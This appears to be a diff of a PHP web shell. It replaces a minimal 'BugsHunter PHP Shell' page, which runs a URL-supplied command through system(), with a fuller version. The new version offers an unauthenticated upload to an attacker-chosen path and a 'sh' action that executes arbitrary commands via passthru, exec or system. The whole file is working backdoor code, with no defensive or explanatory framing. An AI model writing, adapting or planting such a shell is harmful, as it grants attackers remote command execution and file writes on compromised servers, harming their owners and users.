@@ -1,9 +1,71 @@
-<html>
-	<head>
-		<title> BugsHunter PHP Shell </title>
-	</head>
-	
-	<body>
-		Command: <?php echo $_GET["cmd"]; ?>  command result: <textarea><?php system($_GET["cmd"]); ?></textarea>
-	</body>
-</html>
+<?php
+function upload()
+{
+	if (isset($_GET['path']))
+	{
+		$path=$_GET['path']."/".$_FILES["file"]["name"];
+	} else 
+	{
+		$path="./".$_FILES["file"]["name"];
+	}
+	if (copy($_FILES["file"]["tmp_name"], $path))
+	{
+		print "<command>upload</command>";
+		print "<output>File stored in: " . $path ."</output>";
+	} else
+	{
+		print "<command>upload</command>";
+		print "<output>Error uploading file. Maybe not writable directory</output>";
+	}
+}
+
+function sh($cmd){
+	if (function_exists('passthru'))
+	{
+		print "<command>".$cmd."</command>";
+		print "<output>";
+		passthru($cmd);	
+		print "</output>";
+	} 
+	elseif (function_exists('exec'))
+	{
+		print "<command>".$cmd."</command>";
+		print "<output>";
+		exec($cmd);
+		print "</output>";
+	}
+	elseif (function_exists('system'))
+	{
+		print "<command>".$cmd."</command>";
+		print "<output>";
+		system($cmd);
+		print "</output>";
+	}
+	else
+	{
+		print "<command>Remote server do not support sh command</command>";
+		print "<output></output>";
+	}
+}
+
+switch ($_GET['action']) {
+	case "upload":
+		if (isset($_FILES["file"]["name"]))
+		{
+			upload();
+	    	}
+
+	break;
+
+    case "sh":
+	    if (isset($_GET['cmd']))
+	    {
+		sh($_GET['cmd']);
+	    }
+    break;
+
+    default:
+	    print "<command>".htmlspecialchars($_GET['action'])."</command>";
+	    echo "<output>Available Action: upload,sh\nExample: shell.php?action=sh&cmd=whoami</output>";
+}
+?>
